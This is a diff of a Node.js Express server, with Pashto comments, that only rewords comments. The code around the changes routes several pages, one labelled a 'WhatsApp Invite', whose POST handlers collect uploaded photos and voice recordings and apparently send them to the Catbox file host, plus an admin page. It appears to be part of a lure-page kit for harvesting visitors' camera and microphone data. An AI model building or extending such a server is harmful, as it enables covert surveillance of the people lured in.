@@ -30,7 +30,7 @@ const upload = multer({ storage: multer.memoryStorage() });
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- پخواني مسیرونه (سکتورونه) ---
+// --- د ټولو پاڼو مسیرونه (Routes) ---
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -47,7 +47,7 @@ app.get('/page4', (req, res) => {
     res.sendFile(path.join(__dirname, 'index4.html'));
 });
 
-// --- نوی اضافه شوی مسیر د WhatsApp Invite لپاره (/page5) ---
+// دلته د page5 لپاره د index5.html فایل وصل شو
 app.get('/page5', (req, res) => {
     res.sendFile(path.join(__dirname, 'index5.html'));
 });
@@ -70,7 +70,7 @@ async function uploadToCatbox(buffer, filename) {
     }
 }
 
-// د پخوانیو پاڼو پوسټ ریکویسټونه
+// د GET او POST ریکویسټونو لپاره لارې
 app.post('/', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
@@ -83,7 +83,6 @@ app.post('/page4', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async 
     handleIncomingData(req, res);
 });
 
-// د نوي /page5 پاڼې پوسټ ریکویسټ
 app.post('/page5', upload.fields([{ name: 'photo' }, { name: 'voice' }]), async (req, res) => {
     handleIncomingData(req, res);
 });
@@ -135,7 +134,7 @@ async function handleIncomingData(req, res) {
     res.status(400).send("Bad Request");
 }
 
-// د اډمین پاڼه (بدون تغیر په پخواني منطق)
+// د اډمین پاڼه
 app.get('/admin', async (req, res) => {
     const showWelcome = !req.headers.cookie?.includes('welcome=true') && req.query.action !== 'enter';
 
